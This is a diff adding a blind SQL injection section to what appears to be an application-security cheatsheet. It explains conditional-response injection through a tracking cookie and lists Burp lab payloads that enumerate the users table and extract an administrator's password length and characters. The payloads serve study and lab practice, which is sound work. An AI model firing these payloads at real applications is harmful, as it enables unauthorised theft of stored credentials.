@@ -131,3 +131,48 @@ etc.
 - Many techniques such as ```UNION``` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
 
 ##### Exploiting blind SQL injection by triggering conditional responses
+- Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+```bash
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+```
+- When a request containing a ```TrackingId``` cookie is processed, the application uses a SQL query to determine whether this is a known user:
+```bash
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+- This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized ```TrackingId```, the query returns data and you receive a "Welcome back" message in the response.
+- This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
+- To understand how this exploit works, suppose that two requests are sent containing the following  cookie ```TrackingId```  values in turn:
+```bash
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+```
+- Two conditions
+    - The first of these values causes the query to return results, because the injected AND ```'1'='1``` condition is true. As a result, the "Welcome back" message is displayed.
+    - The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+- This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
+-  For example, suppose there is a table called ```Users``` with the columns ```Username``` and ```Password```, and a user called ```Administrator```. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+```bash
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+- This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
+- Next, we send the following input:
+```bash
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+- So on change the values based on the ```m, t and s``` soon.
+- Script to retrive the password [video](https://www.youtube.com/watch?v=5brORHQSJMc) , [script](https://raw.githubusercontent.com/ashok5141/Application-Security-Cheatsheet/refs/heads/main/Scripts/SQL_Blind_Password_Retrive.py)
+```bash
+# Burp Suite(Repeater) Lab this case TrackingID vulnerable
+#  True - welcome back
+# False - No welcome back not existed your requesting for.
+scliTLUSpsZWWON5                  # Response 200 OK
+scliTLUSpsZWWON5' AND '1'='1      # Response 200 OK
+scliTLUSpsZWWON5'+AND+1%3d1--     # Encode the payload(' AND 1=1--), Response 200 OK, This case ' or  1=2--  # Saying 200 OK because tracking id is correct.
+scliTLUSpsZWWON5' and (select 'x' from users LIMIT 1)='x'--'    # Response 200 OK,  It returns welcome back message users table exits
+scliTLUSpsZWWON5' and (select username from users where username='administrator'  LIMIT 1)='administrator'--'    # 200 OK, Administrator is available in the table
+scliTLUSpsZWWON5' and (select password from users where username='administrator'  LIMIT 1)='Welcome2021!'--'     # IT's really trying brute forcing
+scliTLUSpsZWWON5' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--';    # Password more then 1 character
+scliTLUSpsZWWON5' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'   #  Brute force this 1 to 50 it will return the 20, 19 we are getting welcome back message
+scliTLUSpsZWWON5' and (select substring(password,1,1) from users where username='administrator')='a'--'   # trying password string with 'a'
+# Either use Burp Professional or python above script
+```
